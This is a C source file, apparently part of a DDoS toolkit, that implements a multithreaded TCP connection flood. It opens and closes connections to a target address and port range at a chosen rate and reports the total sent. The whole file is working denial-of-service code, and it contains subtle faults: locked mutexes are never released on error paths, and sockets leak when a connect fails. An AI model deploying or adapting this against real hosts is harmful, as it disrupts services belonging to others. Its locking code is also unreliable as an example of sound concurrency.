#include "../header.h"
#include "../base/make_ipv4.h"
#include "../base/make_tcp.h"
#include "../base/receiver.h"
#include "../base/subnet_mask.h"
#include "../base/time_check.h"
#include "../ddos/conn_flood.h"

// session counting
unsigned long g_conn_num_total;
unsigned long g_conn_num_generated_in_sec;
// from main()
char g_conn_src_ip[16];
char g_conn_dest_ip[16];
unsigned int g_conn_src_mask;
unsigned int g_conn_dest_mask;
unsigned int g_conn_dest_port_start;
unsigned int g_conn_dest_port_end;
unsigned int g_conn_request_per_sec;
// for masking next ip address
char g_conn_now_src_ip[16];
char g_conn_now_dest_ip[16];
unsigned int g_conn_now_dest_port;
// thread
pthread_mutex_t g_conn_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t g_conn_cond = PTHREAD_COND_INITIALIZER;
// time checking
struct timespec g_conn_before_time;
struct timespec g_conn_now_time;

void conn_flood_print_usage(void)
{
	printf("CONN flood Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [# requests/s]\n");
	return;
}

void *generate_conn_flood(void *data)
{
	int thread_id = *((int*) data);
	while (1) {
		// *** begin of critical section ***
		pthread_mutex_lock(&g_conn_mutex);
		// get now resource
		generator(g_conn_src_ip,
				g_conn_dest_ip,
				g_conn_src_mask,
				g_conn_dest_mask,
				g_conn_dest_port_start,
				g_conn_dest_port_end,
				g_conn_now_src_ip,
				g_conn_now_dest_ip,
				&g_conn_now_dest_port);
		// wait a second
		if (g_conn_num_generated_in_sec >= g_conn_request_per_sec) {
			pthread_cond_wait(&g_conn_cond, &g_conn_mutex);
		}
		// time checking
		time_check(&g_conn_mutex, &g_conn_cond, &g_conn_before_time, &g_conn_now_time, &g_conn_num_generated_in_sec);
		// make socket
		int sock = socket(AF_INET, SOCK_STREAM, 0);
		if (sock == -1)
		{
			perror("sock creation failed\n");
			continue;
		}
		// connecting
		struct sockaddr_in servaddr;
		servaddr.sin_family = AF_INET;
		servaddr.sin_addr.s_addr = inet_addr(g_conn_dest_ip);
		servaddr.sin_port = htons(g_conn_now_dest_port);
		if (connect(sock, (struct sockaddr*) &servaddr, sizeof(servaddr)) != 0)
		{
			perror("connect failed\n");
			continue;
		}
		close(sock);
		g_conn_num_generated_in_sec++;
		g_conn_num_total++;
		// *** end of critical section ***
		pthread_mutex_unlock(&g_conn_mutex);
	}
	return 0;
}

void *conn_flood_time_check(void *data)
{

	while (1) {
		pthread_mutex_lock(&g_conn_mutex);
		time_check(&g_conn_mutex, &g_conn_cond, &g_conn_before_time, &g_conn_now_time, &g_conn_num_generated_in_sec);
		pthread_mutex_unlock(&g_conn_mutex);
	}
}

void conn_flood_main(char *argv[])
{
	int argc = 0;
	while (argv[argc] != NULL) {
		argc++;
	}
	if (argc != 4) {
		conn_flood_print_usage();
		return;
	}
	split_ip_mask_port(argv,
			g_conn_src_ip,
			g_conn_dest_ip,
			&g_conn_src_mask,
			&g_conn_dest_mask,
			&g_conn_dest_port_start,
			&g_conn_dest_port_end);
	g_conn_num_generated_in_sec = 0;
	g_conn_num_total = 0;
	memset(&g_conn_before_time, 0, sizeof(struct timespec));
	memset(&g_conn_now_time, 0, sizeof(struct timespec));
	g_conn_request_per_sec = atoi(argv[3]);
	const int num_threads = 10;
	pthread_t threads[9999];
	int thread_ids[9999];
	for (int i = 0; i < num_threads; i++) {
		thread_ids[i] = i;
	}
	printf("Sending CONN requests to %s using %d threads\n", g_conn_dest_ip, num_threads);
	int i;
	for (i = 0; i < num_threads; i++) {
		pthread_create(&threads[i], NULL, generate_conn_flood, (void *)&thread_ids[i]);
	}
	pthread_create(&threads[i], NULL, conn_flood_time_check, NULL);
	for (int i = 0; i < num_threads; i++) {
		pthread_join(threads[i], NULL);
		printf("thread %d joined\n", i);
	}
	pthread_mutex_destroy(&g_conn_mutex);
	printf("CONN flood finished\nTotal %lu packets sent.\n", g_conn_num_total);
	pthread_exit(NULL);
	return;
}
